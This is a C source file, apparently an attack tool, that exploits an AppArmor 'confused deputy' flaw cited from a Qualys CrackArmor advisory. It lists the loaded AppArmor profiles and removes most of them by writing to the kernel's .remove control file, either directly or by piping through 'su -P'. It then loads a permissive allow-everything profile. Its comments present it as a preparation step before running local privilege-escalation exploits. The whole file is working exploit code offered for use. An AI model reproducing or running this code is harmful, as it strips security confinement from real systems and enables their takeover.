/*
 * crackarmor_bypass.c -- AppArmor Confused Deputy (CrackArmor #1)
 *
 * Qualys CrackArmor advisory 2026-03-10, vulnerability #1:
 *   AppArmor control pseudo-files (.load, .replace, .remove) can be written
 *   by unprivileged users via privileged SUID programs (the "confused deputy"
 *   pattern). Specifically, "su -P" in PTY mode writes user-controlled data
 *   to .load/.replace/.remove with root credentials.
 *
 * This binary is a standalone AppArmor bypass helper:
 *   1. Reads the current list of loaded AppArmor profiles
 *   2. Removes all non-kernel-critical profiles (weakens confinement)
 *   3. Optionally loads a custom permissive profile
 *   4. Reports any profiles that could not be removed
 *
 * Use case: run before CVE-based LPE exploits if AppArmor confinement is
 *   blocking the exploit (e.g., www-data AppArmor profile blocking userns,
 *   ptrace, or /proc access needed by the exploit).
 *
 * Does NOT grant root -- it only weakens AppArmor policy. Run LPE exploit after.
 *
 * Requires: su SUID binary, apparmor_parser, /sys/kernel/security/apparmor
 *
 * Compile: gcc -std=gnu99 -Wall -O2 crackarmor_bypass.c -o crackarmor_bypass
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* -- tunables ---------------------------------------------------------- */

#define APPARMOR_FS   "/sys/kernel/security/apparmor"
#define AA_LOAD       APPARMOR_FS "/.load"
#define AA_REPLACE    APPARMOR_FS "/.replace"
#define AA_REMOVE     APPARMOR_FS "/.remove"
#define AA_NS_ROOT    APPARMOR_FS "/policy/namespaces"

/*
 * Profiles to always KEEP (critical for system stability).
 * Removing these may cause login, D-bus, or init to malfunction.
 */
static const char *KEEP_PROFILES[] = {
    "unconfined",
    "lsb_release",
    "nvidia_modprobe",
    NULL
};

/* Permissive "allow everything" profile loaded to replace confined ones */
#define BYPASS_PROFILE_NAME  "crackarmor_bypass_permissive"
#define BYPASS_PROFILE_TEXT \
    "profile " BYPASS_PROFILE_NAME " /** {\n" \
    "  /** rwlkmix,\n" \
    "  capability,\n" \
    "  network,\n" \
    "  ptrace,\n" \
    "  signal,\n" \
    "  dbus,\n" \
    "  unix,\n" \
    "}\n"

/* -- helpers ----------------------------------------------------------- */

static void pr_info(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[*] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
static void pr_good(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[+] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}
static void pr_fail(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("[-] "); vprintf(fmt, ap); va_end(ap); fflush(stdout);
}

static int run_cmd(const char *cmd) {
    static const char *shells[] = { "/bin/sh", "/bin/bash", NULL };
    for (int i = 0; shells[i]; i++) {
        pid_t pid = fork();
        if (pid < 0) continue;
        if (pid == 0) {
            char *argv[] = { (char *)shells[i], "-c", (char *)cmd, NULL };
            execv(shells[i], argv);
            _exit(127);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 127)
            return WEXITSTATUS(status);
    }
    return -1;
}

static ssize_t write_file(const char *path, const void *data, size_t len) {
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t w = write(fd, data, len);
    close(fd);
    return w;
}

static int is_keep_profile(const char *name) {
    for (int i = 0; KEEP_PROFILES[i]; i++)
        if (strcmp(name, KEEP_PROFILES[i]) == 0) return 1;
    /* keep anything starting with "snap." -- removing snappy profiles causes issues */
    if (strncmp(name, "snap.", 5) == 0) return 1;
    return 0;
}

/* -- direct remove via write to .remove ------------------------------- */

static int remove_profile_direct(const char *name) {
    return write_file(AA_REMOVE, name, strlen(name)) > 0 ? 0 : -1;
}

/*
 * Confused deputy remove via su -P:
 *   su -P proxies PTY I/O while running SUID. By redirecting su's stdout
 *   to .remove, we write profile names with root credentials even though
 *   we're unprivileged.
 *   CALIBRATE: may need PAM config that allows su without password for current user.
 */
static int remove_profile_confused_deputy(const char *name) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "echo '%s' | su -P -c 'stty raw 2>/dev/null; cat' \"$(id -un)\" "
        "> \"" AA_REMOVE "\" 2>/dev/null", name);
    return run_cmd(cmd) == 0 ? 0 : -1;
}

static int remove_profile_any(const char *name) {
    if (remove_profile_direct(name) == 0)          return 0;
    if (remove_profile_confused_deputy(name) == 0) return 0;
    return -1;
}

/* -- load bypass profile via confused deputy --------------------------- */

static int load_bypass_profile(void) {
    /* Write the permissive profile text to a tmp file */
    char tmp[] = "/tmp/.ca_bp_XXXXXX";
    int fd = mkstemp(tmp);
    if (fd < 0) return -1;
    const char *text = BYPASS_PROFILE_TEXT;
    write(fd, text, strlen(text));
    close(fd);

    /* Method 1: apparmor_parser -r (works if privileged or in userns) */
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "apparmor_parser -r '%s' >/dev/null 2>&1", tmp);
    int r = run_cmd(cmd);

    if (r != 0) {
        /* Method 2: compile binary + confused deputy */
        char bin_tmp[] = "/tmp/.ca_bpb_XXXXXX";
        int bfd = mkstemp(bin_tmp); if (bfd >= 0) close(bfd);
        snprintf(cmd, sizeof(cmd),
            "apparmor_parser -b '%s' -o '%s' 2>/dev/null", tmp, bin_tmp);
        if (run_cmd(cmd) == 0) {
            snprintf(cmd, sizeof(cmd),
                "su -P -c 'stty raw 2>/dev/null; exec cat \"%s\"' \"$(id -un)\" "
                "> \"" AA_LOAD "\" 2>/dev/null", bin_tmp);
            r = run_cmd(cmd);
            unlink(bin_tmp);
        }
    }

    unlink(tmp);
    return r == 0 ? 0 : -1;
}

/* -- enumerate all loaded profiles ------------------------------------ */

typedef struct { char name[256]; } profile_entry;
static profile_entry *g_profiles = NULL;
static int g_n_profiles = 0;
static int g_profiles_cap = 0;

static void add_profile(const char *name) {
    if (g_n_profiles >= g_profiles_cap) {
        g_profiles_cap = g_profiles_cap ? g_profiles_cap * 2 : 256;
        g_profiles = realloc(g_profiles, g_profiles_cap * sizeof(*g_profiles));
        if (!g_profiles) return;
    }
    strncpy(g_profiles[g_n_profiles].name, name, 255);
    g_profiles[g_n_profiles].name[255] = '\0';
    g_n_profiles++;
}

static void enumerate_profiles(void) {
    /* Parse /sys/kernel/security/apparmor/profiles -- format: "name (mode)\n" */
    FILE *f = fopen(APPARMOR_FS "/profiles", "r");
    if (!f) {
        pr_fail("cannot open " APPARMOR_FS "/profiles: %m\n");
        return;
    }
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        /* strip trailing spaces and "(mode)" suffix */
        char *p = strrchr(line, '(');
        if (p && p > line) { p--; while (p > line && *p == ' ') p--; *++p = '\0'; }
        /* strip newline */
        p = strchr(line, '\n'); if (p) *p = '\0';
        if (line[0]) add_profile(line);
    }
    fclose(f);
    pr_good("enumerated %d loaded profiles\n", g_n_profiles);
}

/* -- main -------------------------------------------------------------- */

int main(int argc, char **argv) {
    (void)argc; (void)argv;

    printf("[*] CrackArmor #1 -- AppArmor Confused Deputy Bypass\n");
    printf("[*] Qualys advisory 2026-03-10 | AppArmor confinement weakener\n\n");

    if (access(APPARMOR_FS, F_OK) != 0) {
        pr_fail("AppArmor not active -- nothing to bypass\n");
        return 1;
    }

    /* 1. Enumerate profiles */
    enumerate_profiles();
    if (g_n_profiles == 0) {
        pr_fail("no profiles found\n");
        return 1;
    }

    /* 2. Remove all non-critical profiles */
    int removed = 0, failed = 0;
    for (int i = 0; i < g_n_profiles; i++) {
        const char *name = g_profiles[i].name;
        if (is_keep_profile(name)) {
            pr_info("kept: %s\n", name);
            continue;
        }
        if (remove_profile_any(name) == 0) {
            pr_good("removed: %s\n", name);
            removed++;
        } else {
            pr_fail("could not remove: %s\n", name);
            failed++;
        }
    }
    printf("\n[*] removed: %d  failed: %d  kept: %d\n",
           removed, failed, g_n_profiles - removed - failed);

    /* 3. Load a permissive bypass profile */
    pr_info("loading permissive bypass profile...\n");
    if (load_bypass_profile() == 0) {
        pr_good("bypass profile '%s' loaded -- AppArmor confinement weakened\n",
                BYPASS_PROFILE_NAME);
    } else {
        pr_fail("could not load bypass profile\n");
    }

    /* 4. Report current AppArmor status */
    printf("\n");
    run_cmd("cat /sys/kernel/security/apparmor/profiles 2>/dev/null | head -20");

    if (removed > 0) {
        printf("\n[+] AppArmor confinement weakened (%d profiles removed).\n", removed);
        printf("[*] Now run the LPE exploit (e.g., crackarmor_uaf or crackarmor_df).\n");
        return 0;
    }
    return failed > 0 ? 2 : 0;
}
